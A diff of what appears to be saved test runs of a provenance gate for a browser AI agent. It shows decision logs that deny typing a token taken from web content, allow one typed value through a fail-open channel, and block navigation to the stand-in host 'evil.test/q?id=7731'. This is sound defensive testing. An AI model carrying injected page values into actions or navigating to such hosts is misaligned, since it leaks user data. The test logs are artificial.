-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-472a1702", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:13Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "01e2e10c527355bf9b8d974a0afa73ffafd3fd7dfcadd0fefce6a528f7e28969", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_a4941d724b77141076840750", "role": "operator", "signature": "89e4b46a26139f37d3747831ad29e6d16d46fcf311027dc5492bac9b2ec63467", "signing_key_id": "agentlock-browser", "timestamp": 1787404033.3815014, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404033.381561, "value": "http://fixture.test/t3_form.html"}
-{"action": "type", "allowed": false, "audit_id": "agentlock-2026-08-22-4da4b683", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'value' carries a value that originated in untrusted context (web_content:cprov_aa692e6e6dc9d65f) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "element_id": "1-e7", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "str", "matched_param": "value", "matched_token": "tk-4417-zz", "untrusted_provenance_id": "cprov_aa692e6e6dc9d65f", "untrusted_source_ref": "web_content:cprov_aa692e6e6dc9d65f"}, "grant_basis": null, "iso": "2026-08-22T13:07:13Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "dfaae071bf01e2ef3a694616e9a8eef5e9117c8c4570882db03c7e68e3344ab7", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_6e7330f3719cb966d70bde07", "role": "operator", "signature": "b38832e42753e0f3f2bd64b470b3f9e6e437712e5b445c496a4416efc998efd9", "signing_key_id": "agentlock-browser", "timestamp": 1787404033.412064, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787404033.4121215, "value": "tk-4417-zz"}
-{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-22-dc955970", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e7", "elicitation_id": "elic_18ce227f91a28ff6", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:13Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "dfaae071bf01e2ef3a694616e9a8eef5e9117c8c4570882db03c7e68e3344ab7", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_ba89621020cc5f13990dda5b", "role": "operator", "signature": "71d4ab610c475248125cf08bbbd77837936c27e0a6d225d9ae055352621fa3e9", "signing_key_id": "agentlock-browser", "timestamp": 1787404033.4141886, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787404033.414229, "value": "tk-4417-zz"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-070b4106", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:35Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "01e2e10c527355bf9b8d974a0afa73ffafd3fd7dfcadd0fefce6a528f7e28969", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_2adaa4d5938322904a0707fe", "role": "operator", "signature": "d9294b5d0a959fa0e1d7eee8ba96dd484b9b2d467f1aead9078315668e902f48", "signing_key_id": "agentlock-browser", "timestamp": 1787758115.005493, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758115.005571, "value": "http://fixture.test/t3_form.html"}
+{"action": "type", "allowed": false, "audit_id": "agentlock-2026-08-26-c6c88dac", "channel": "PAGE", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'value' carries a value that originated in untrusted context (web_content:cprov_6ff0c20c48d2dafa) and is absent from the authoritative user request. Gated on parameter provenance, not content.", "element_id": "1-e7", "event": "decision", "evidence": {"gate": "param_lineage", "matched_kind": "str", "matched_param": "value", "matched_token": "tk-4417-zz", "untrusted_provenance_id": "cprov_6ff0c20c48d2dafa", "untrusted_source_ref": "web_content:cprov_6ff0c20c48d2dafa"}, "grant_basis": null, "iso": "2026-08-26T15:28:35Z", "origin": "http://fixture.test", "reason": "param_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "dfaae071bf01e2ef3a694616e9a8eef5e9117c8c4570882db03c7e68e3344ab7", "policy_version_hash": "", "reason": "param_lineage", "receipt_id": "rcpt_623c7d93fcbd01f0bc125be9", "role": "operator", "signature": "462d78cd79d8b18adccc6f52670545f455e6eb4a8d3df90214dda6d4de639294", "signing_key_id": "agentlock-browser", "timestamp": 1787758115.0431058, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787758115.043162, "value": "tk-4417-zz"}
+{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-26-a0008fc5", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e7", "elicitation_id": "elic_18cf64889f7985a8", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:35Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "dfaae071bf01e2ef3a694616e9a8eef5e9117c8c4570882db03c7e68e3344ab7", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_b016edcbed8527baf261a0d3", "role": "operator", "signature": "c06b7168a37eb35ab3a288d81759eca7f5a64b78711b209e2ca3f72b5bf4c9d0", "signing_key_id": "agentlock-browser", "timestamp": 1787758115.0455668, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787758115.0456016, "value": "tk-4417-zz"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -746,7 +746,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-07e94bb4",
+    "audit_id": "agentlock-2026-08-26-a5ebf12f",
     "channel": "ALLOWLIST",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -755,7 +755,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_d9ed8c74194d7204d346fb6a",
+    "receipt_id": "rcpt_58a14c26a56df5243418cc0f",
     "target": ""
   },
   "ok": true,
@@ -821,7 +821,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-908aac88",
+    "audit_id": "agentlock-2026-08-26-b962bdaf",
     "channel": "USER_CONFIRMED",
     "confirmation": "accepted",
     "decided_by": "agentlock_gate",
@@ -830,7 +830,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_7f95f369c90d38a484f8c741",
+    "receipt_id": "rcpt_12518e3d423f0778a09f0ac5",
     "target": ""
   },
   "ok": true,
@@ -854,9 +854,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'provenance', 'decision'
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-07e94bb4", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:14Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "0a4ce318c9af360b9f683a2fb03ac2c0ee5731e4169caaaa2940c808d826dd91", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_d9ed8c74194d7204d346fb6a", "role": "operator", "signature": "e8d65e6bebb0d5c3d48648083c4473774aab240baa014c56a2c6edae3063082a", "signing_key_id": "agentlock-browser", "timestamp": 1787404034.9001167, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404034.900177, "value": "http://fixture.test/el7_form.html"}
-{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-22-e55f13f6", "channel": "UNCLASSIFIED", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e4", "event": "decision", "evidence": null, "fail_open": true, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match:no_tokens", "param_lineage": "no_match:no_tokens", "post_authoritative_taint": true, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:14Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "38800c7e2927b420c020a68ed91386e108548bc50b2f56ed3594fea5b99238fb", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_19cc0ef6ba28fa8174e5422c", "role": "operator", "signature": "575e45e3e53ae54434120ca592d237284a7b867ef9216fd426a350926c2eb484", "signing_key_id": "agentlock-browser", "timestamp": 1787404034.9505374, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787404034.9506555, "value": "expenses"}
-{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-22-908aac88", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e4", "elicitation_id": "elic_18ce227fed578388", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match:no_tokens", "param_lineage": "no_match:no_tokens", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:14Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "38800c7e2927b420c020a68ed91386e108548bc50b2f56ed3594fea5b99238fb", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_7f95f369c90d38a484f8c741", "role": "operator", "signature": "7ec5e4a760124d64a0510b47e2478e79498126eeb794319212340d050bb88ad6", "signing_key_id": "agentlock-browser", "timestamp": 1787404034.952571, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787404034.9526098, "value": "expenses"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-a5ebf12f", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:37Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "0a4ce318c9af360b9f683a2fb03ac2c0ee5731e4169caaaa2940c808d826dd91", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_58a14c26a56df5243418cc0f", "role": "operator", "signature": "a3a0ea3cc365818c7f5335196c74e42959dc69152eb26c0985c9f0257e463def", "signing_key_id": "agentlock-browser", "timestamp": 1787758117.0410223, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758117.0410793, "value": "http://fixture.test/el7_form.html"}
+{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-26-0fcc33f5", "channel": "UNCLASSIFIED", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e4", "event": "decision", "evidence": null, "fail_open": true, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match:no_tokens", "param_lineage": "no_match:no_tokens", "post_authoritative_taint": true, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:37Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "38800c7e2927b420c020a68ed91386e108548bc50b2f56ed3594fea5b99238fb", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_cc6b3ac47eca6a5f4f7f8cde", "role": "operator", "signature": "1da6184cae4a522e549ec37a1a7d5368e5474e2e38287e8960631e37f4855dc1", "signing_key_id": "agentlock-browser", "timestamp": 1787758117.077072, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787758117.0771885, "value": "expenses"}
+{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-26-b962bdaf", "channel": "USER_CONFIRMED", "confirmation": "accepted", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e4", "elicitation_id": "elic_18cf648918b6e446", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match:no_tokens", "param_lineage": "no_match:no_tokens", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:37Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "38800c7e2927b420c020a68ed91386e108548bc50b2f56ed3594fea5b99238fb", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_12518e3d423f0778a09f0ac5", "role": "operator", "signature": "b244a4b3a9bd50968be35c42c87a57c893e8d98450bdbff146b90e55e51d6b49", "signing_key_id": "agentlock-browser", "timestamp": 1787758117.0796475, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787758117.079705, "value": "expenses"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -877,7 +877,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-aada7388",
+    "audit_id": "agentlock-2026-08-26-d0a7b78a",
     "channel": "ALLOWLIST",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -886,7 +886,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_f01ce9ce7c20a803422705e4",
+    "receipt_id": "rcpt_5f7f6dd1e75cf6fa2bda91f1",
     "target": ""
   },
   "ok": true,
@@ -952,7 +952,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-2d9e5d8e",
+    "audit_id": "agentlock-2026-08-26-176ab05a",
     "channel": "UNCLASSIFIED",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -961,7 +961,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": true,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_e142ef1a064495bdb3f372ab",
+    "receipt_id": "rcpt_b2357aff8c0884005d30f389",
     "target": ""
   },
   "ok": true,
@@ -985,8 +985,8 @@ log_events = ['provenance', 'provenance', 'provenance', 'provenance', 'decision'
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-aada7388", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:16Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "0a4ce318c9af360b9f683a2fb03ac2c0ee5731e4169caaaa2940c808d826dd91", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_f01ce9ce7c20a803422705e4", "role": "operator", "signature": "8cf5ecf3eea4eb42698641123b31365882380f5a91e2fb8ee6ebbe0242b4cb5e", "signing_key_id": "agentlock-browser", "timestamp": 1787404036.3892224, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404036.3892825, "value": "http://fixture.test/el7_form.html"}
-{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-22-2d9e5d8e", "channel": "UNCLASSIFIED", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e4", "event": "decision", "evidence": null, "fail_open": true, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match:no_tokens", "param_lineage": "no_match:no_tokens", "post_authoritative_taint": true, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-22T13:07:16Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "38800c7e2927b420c020a68ed91386e108548bc50b2f56ed3594fea5b99238fb", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_e142ef1a064495bdb3f372ab", "role": "operator", "signature": "8346b779f97ce3d37223a7de4524544bf7f164e32061fb10304549a5ccc82983", "signing_key_id": "agentlock-browser", "timestamp": 1787404036.4260502, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787404036.4261744, "value": "expenses"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-d0a7b78a", "cause": "tool", "channel": "ALLOWLIST", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:39Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "0a4ce318c9af360b9f683a2fb03ac2c0ee5731e4169caaaa2940c808d826dd91", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_5f7f6dd1e75cf6fa2bda91f1", "role": "operator", "signature": "627511a1cb1738ea6faf6c83f0f415142aa505d2876d59b414d931ac93b1f952", "signing_key_id": "agentlock-browser", "timestamp": 1787758119.0285704, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758119.0286305, "value": "http://fixture.test/el7_form.html"}
+{"action": "type", "allowed": true, "audit_id": "agentlock-2026-08-26-176ab05a", "channel": "UNCLASSIFIED", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "element_id": "1-e4", "event": "decision", "evidence": null, "fail_open": true, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match:no_tokens", "param_lineage": "no_match:no_tokens", "post_authoritative_taint": true, "session_lineage": "not_run:no_active_lineage_policy", "tainted": true}, "iso": "2026-08-26T15:28:39Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "38800c7e2927b420c020a68ed91386e108548bc50b2f56ed3594fea5b99238fb", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_b2357aff8c0884005d30f389", "role": "operator", "signature": "e6ba74f901915c6eb4d94a6dbc1f9bf600bd31d159471eceac33fb22edfe3477", "signing_key_id": "agentlock-browser", "timestamp": 1787758119.0642684, "tool_name": "browser.type", "trust_ceiling": null, "user_id": "agentlock-browser:type"}, "tool": "browser.type", "ts": 1787758119.0643766, "value": "expenses"}
 
 AGAINST THE FREEZE
 ------------------------------------------------------------------------
@@ -1007,7 +1007,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": true,
-    "audit_id": "agentlock-2026-08-22-e4b2577f",
+    "audit_id": "agentlock-2026-08-26-7cfa52a7",
     "channel": "USER",
     "confirmation": "",
     "decided_by": "agentlock_gate",
@@ -1016,7 +1016,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "",
-    "receipt_id": "rcpt_0ec6037554eb5af4e4a10e95",
+    "receipt_id": "rcpt_75d9524e42586640dceb5511",
     "target": ""
   },
   "ok": true,
@@ -1031,7 +1031,7 @@ TOOL CALLS AND RAW RESULTS
   "error": "",
   "gate": {
     "allowed": false,
-    "audit_id": "agentlock-2026-08-22-18f93ea9",
+    "audit_id": "agentlock-2026-08-26-36e3b893",
     "channel": "MODEL",
     "confirmation": "unavailable",
     "decided_by": "agentlock_gate",
@@ -1040,7 +1040,7 @@ TOOL CALLS AND RAW RESULTS
     "fail_open": false,
     "origin": "",
     "reason": "novel_lineage",
-    "receipt_id": "rcpt_f9a63a48cc022536124fde12",
+    "receipt_id": "rcpt_6eff867d6267ec20a803e35f",
     "target": ""
   },
   "ok": false,
@@ -1065,9 +1065,9 @@ log_events = ['provenance', 'provenance', 'provenance', 'decision', 'decision', 
 
 DECISION LOG (raw JSONL)
 ------------------------------------------------------------------------
-{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-22-e4b2577f", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-22T13:07:17Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_0ec6037554eb5af4e4a10e95", "role": "operator", "signature": "e254dc047d159db928a6b00304a94ca68326498657e5fe115484a9a3f3cc0d27", "signing_key_id": "agentlock-browser", "timestamp": 1787404037.9108756, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787404037.9109514, "value": "http://fixture.test/index.html"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-18f93ea9", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:17Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_f9a63a48cc022536124fde12", "role": "operator", "signature": "d99be8c09c6d69c47565f4e955ac4ec3b61f735fa7ff9bc8024812b34105b275", "signing_key_id": "agentlock-browser", "timestamp": 1787404037.9356291, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404037.935696, "value": "http://evil.test/q?id=7731"}
-{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-22-18f93ea9", "cause": "tool", "channel": "MODEL", "confirmation": "unavailable", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-22T13:07:17Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_f9a63a48cc022536124fde12", "role": "operator", "signature": "d99be8c09c6d69c47565f4e955ac4ec3b61f735fa7ff9bc8024812b34105b275", "signing_key_id": "agentlock-browser", "timestamp": 1787404037.9356291, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787404037.9358406, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": true, "audit_id": "agentlock-2026-08-26-7cfa52a7", "cause": "tool", "channel": "USER", "confirmation": "", "decided_by": "agentlock_gate", "decision": "allow", "detail": "", "event": "decision", "evidence": null, "grant_basis": {"lineage_policy": "declared_disabled", "novel_lineage": "no_match", "param_lineage": "no_match:no_untrusted_context", "post_authoritative_taint": false, "session_lineage": "not_run:no_active_lineage_policy", "tainted": false}, "iso": "2026-08-26T15:28:41Z", "origin": "", "reason": "", "receipt": {"context_hash": "", "decision": "allow", "metadata": {}, "parameters_hash": "6edf0445dad73cfd64fa187f3bce85974364716c1f51d869924dcafd2b582c7e", "policy_version_hash": "", "reason": "", "receipt_id": "rcpt_75d9524e42586640dceb5511", "role": "operator", "signature": "a64f6e7255d4302bced9e1d56376d2779f6e1ce010d9fe52656bf7d1dd530364", "signing_key_id": "agentlock-browser", "timestamp": 1787758121.037572, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://fixture.test", "tool": "browser.navigate", "ts": 1787758121.037639, "value": "http://fixture.test/index.html"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-36e3b893", "cause": "tool", "channel": "MODEL", "confirmation": "", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:41Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_6eff867d6267ec20a803e35f", "role": "operator", "signature": "bd2934ee16e8da15b3d9fe1ef65bad3b95fabe80b99f35f6a316081656815dea", "signing_key_id": "agentlock-browser", "timestamp": 1787758121.0618162, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", "ts": 1787758121.0619388, "value": "http://evil.test/q?id=7731"}
+{"action": "navigate_url", "allowed": false, "audit_id": "agentlock-2026-08-26-36e3b893", "cause": "tool", "channel": "MODEL", "confirmation": "unavailable", "decided_by": "agentlock_gate", "decision": "deny", "detail": "Parameter 'url' carries token 'evil.test/q?id=7731', which traces to neither the authoritative user request nor any untrusted context in this session. The target is novel -- unaccounted for by provenance. Gated on token provenance, not content.", "elicitation_id": "", "event": "decision", "evidence": {"classification": "novel", "gate": "novel_lineage", "matched_param": "url", "matched_token": "evil.test/q?id=7731"}, "grant_basis": null, "iso": "2026-08-26T15:28:41Z", "origin": "", "reason": "novel_lineage", "receipt": {"context_hash": "", "decision": "deny", "metadata": {}, "parameters_hash": "b9f1eeb70640d5bda8f968b501fd4807608df6a01de3ac9299ef75cafb121341", "policy_version_hash": "", "reason": "novel_lineage", "receipt_id": "rcpt_6eff867d6267ec20a803e35f", "role": "operator", "signature": "bd2934ee16e8da15b3d9fe1ef65bad3b95fabe80b99f35f6a316081656815dea", "signing_key_id": "agentlock-browser", "timestamp": 1787758121.0618162, "tool_name": "browser.navigate", "trust_ceiling": null, "user_id": "agentlock-browser:navigate"}, "target_origin": "http://evil.test", "tool": "browser.navigate", 